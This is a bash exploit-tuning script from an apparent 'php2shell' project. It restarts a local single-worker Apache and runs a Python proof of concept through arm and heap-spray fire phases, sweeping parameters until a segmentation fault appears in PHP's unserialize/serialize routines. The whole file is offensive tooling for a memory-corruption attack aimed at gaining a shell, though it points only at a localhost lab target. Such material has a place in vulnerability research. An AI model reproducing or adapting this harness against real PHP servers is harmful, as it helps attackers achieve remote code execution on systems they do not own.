#!/bin/bash
# php2shell completion sweep: single-child Apache (deterministic affinity).
# Arms, then steps END-cleanup-decode tuning + fire spray until the marker
# SIGSEGV lands in php_var_unserialize / php_var_serialize.
# Usage: bash weapon_singlechild.sh [port]
set -u
PORT=${1:-18120}
ROOT=/tmp/php2shell_ap
HERE=$(cd "$(dirname "$0")" && pwd)
POC=${POC:-$HERE/../tool/poc_unserialize.py}
SID=u0123456789abcdefghijklmnopqrstuv
URL=http://127.0.0.1:$PORT/index.php

pkill apache2 2>/dev/null; sleep 0.5
grep -q MaxRequestWorkers $ROOT/httpd.conf || echo "MaxRequestWorkers 1" >> $ROOT/httpd.conf
/usr/sbin/apache2 -f $ROOT/httpd.conf -k start 2>/dev/null
for i in $(seq 1 30); do curl -s -o /dev/null --max-time 2 $URL && break; sleep 0.3; done

for NL in 98304 114688 131072 147456; do
  rm -f $ROOT/sess/sess_$SID
  timeout 90 python3 $POC $URL --lab --sid $SID --skip-p1 --skip-fire \
    --arm-files 20 --arm-namelen $NL 2>&1 | grep -E '\[arm'
  F=$(grep -E exhausted $ROOT/error.log | tail -1)
  echo "  namelen=$NL fatal: $F"
  rm -f $ROOT/sess/sess_$SID
  for FS in 200 250 300 350 400; do
    R=$(timeout 60 python3 $POC $URL --lab --sid $SID --skip-arm --skip-p1 \
        --fire-sid $SID --spray $FS 2>&1 | grep -E '\[fire\] status')
    SEG=$(grep -cE "exit signal|Segmentation|SIGSEGV" $ROOT/error.log)
    echo "  fs=$FS $R seg=$SEG"
    if [ "${SEG:-0}" -gt 0 ]; then
      echo "==== SEGFAULT RECEIPT namelen=$NL fs=$FS ===="
      grep -E "exit signal|Segmentation|SIGSEGV" $ROOT/error.log | tail -3
      exit 0
    fi
    # re-arm only if the child died (apache respawns it clean)
    curl -s -o /dev/null --max-time 2 $URL || { sleep 1; /usr/sbin/apache2 -f $ROOT/httpd.conf -k start 2>/dev/null; }
  done
done
echo SWEEP_DONE
